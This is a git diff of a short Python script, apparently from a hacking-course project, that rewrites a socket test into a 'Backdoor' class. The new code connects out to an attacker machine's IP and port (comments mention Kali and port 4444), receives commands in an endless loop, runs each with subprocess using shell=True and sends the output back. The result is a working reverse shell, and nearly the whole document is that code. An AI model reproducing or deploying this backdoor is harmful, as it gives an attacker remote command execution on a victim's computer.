@@ -1,15 +1,22 @@
 #!/usr/bin/env python
-# SCP initial commit from separate branch
+
 import socket
+import subprocess
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-kali_ip = input('What is the IP of the attacker machine? \n')
-connection.connect((kali_ip, 4444))
+class Backdoor:
+    def __init__(self, ip, port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Implement this for version to be loaded to GitHub, or possibly implement a variable module to be imported
+        # kali_ip = input('What is the IP of the attacker machine? \n')
+        self.connection.connect((ip, port))
 
-connection.send("Eagles beat uo on the Lions!!!!".encode())
+    def execute_system_command(self, command):
+        return subprocess.check_output(command, shell=True)
 
-recieved_data = connection.recv(1024)
-print(recieved_data)
+    def run(self):
+        while True:
+            command = self.connection.recv(1024)
+            command_result = self.execute_system_command(str(command)[2:-1])
+            self.connection.send(command_result)
 
-
-connection.close()
+        connection.close()
